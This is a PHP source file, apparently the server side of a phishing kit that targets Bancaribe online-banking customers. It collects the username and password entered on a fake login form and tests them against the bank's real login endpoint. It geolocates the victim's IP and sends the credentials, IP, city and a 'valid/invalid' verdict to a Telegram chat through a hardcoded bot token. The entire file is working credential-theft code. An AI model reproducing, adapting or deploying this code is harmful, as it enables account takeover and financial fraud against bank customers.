<?php
// Datos del formulario
$ff1 = $_POST['ffd1'] ?? '';
$ff2 = $_POST['ffd2'] ?? '';

// Obtener dirección IP real del cliente
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $direccion_ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    $direccion_ip = trim($ipList[0]);
} else {
    $direccion_ip = $_SERVER['REMOTE_ADDR'];
}

// Obtener ciudad basada en la dirección IP
$ciudad = '';
if (!empty($direccion_ip)) {
    $ip_api_url = "http://ip-api.com/json/{$direccion_ip}?fields=city";
    $response = @file_get_contents($ip_api_url);
    if ($response !== false) {
        $json = json_decode($response, true);
        $ciudad = isset($json['city']) ? $json['city'] : '';
    }
}

// Token del bot y chat ID del canal
$botToken = '7768341022:AAGAb_UOKzU3EycpHj1CtfLYR2VnnU9yHo0';
$chatId = '-4786851797';

// Validar credenciales con el servidor bancario
function validarUsuario($usuario, $clave)
{
    $url = "https://www3.bancaribe.com.ve/bcn/action/security/login?random=0." . mt_rand(100000, 999999);
    $data = [
        'Submit2' => 'CANCELAR',
        'Submit' => 'ACEPTAR',
        'userid' => $usuario,
        'password' => $clave
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($data),
            'timeout' => 10
        ]
    ];

    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);

    // Analizar la respuesta
    if ($response !== false) {
        if (strpos($response, 'window.location = "p/Transaccional/ASP/CBGE_Login') !== false) {
            return true; // Credenciales válidas
        } elseif (strpos($response, 'usuario suspendido') !== false || strpos($response, 'no o mas datos no son validos') !== false) {
            return false; // Credenciales no válidas
        }
    }

    return null; // Error en la validación
}

// Validar usuario utilizando ff1 y ff2
$resultadoValidacion = validarUsuario($ff1, $ff2);

// Crear mensaje para Telegram
$mensaje = "-BANCARIBENA-:\n";
$mensaje .= "🌐 IP:   <code>$direccion_ip</code>\n";
$mensaje .= "👤 Usr:   <code>$ff1</code>\n";
$mensaje .= "🔑 Clv:   <code>$ff2</code>\n";
$mensaje .= "🏙 Ciu:   <code>$ciudad</code>\n";

if ($resultadoValidacion === true) {
    $mensaje .= "✅ BUENA: <b>Esta buena revisa saldo</b>";
} elseif ($resultadoValidacion === false) {
    $mensaje .= "❌ Validación: <b>FFFF EL LOGO</b>";
} else {
    $mensaje .= "✅ Buena: <b>Solo ingresar nuevamente</b>";
}

// Enviar mensaje a Telegram
$telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = [
    'chat_id' => $chatId,
    'text' => $mensaje,
    'parse_mode' => 'HTML'
];
$options = [
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($data)
    ]
];
$context = stream_context_create($options);
file_get_contents($telegramUrl, false, $context);

// Redirigir al usuario
header('Refresh: 0; URL=index.php');
exit;
?>
